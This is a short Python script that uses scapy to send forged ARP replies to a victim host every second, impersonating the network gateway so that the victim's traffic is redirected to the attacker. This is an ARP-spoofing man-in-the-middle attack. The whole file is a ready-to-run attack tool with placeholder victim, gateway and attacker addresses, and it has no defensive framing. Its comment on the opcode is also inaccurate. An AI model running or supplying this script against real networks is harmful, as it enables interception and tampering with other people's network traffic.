from scapy.all import *

import time

from scapy.layers.l2 import ARP

op=2 # Op code 1 for query arp
victim="192.168.3.110" # replace with the victim's IP
spoof="192.168.3.1"  # replace with the IP of the gateway
mac="00:0c:29:bc:92:12" # replace with the attacker's MAC address

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

while True:
	send(arp)
	time.sleep(1)
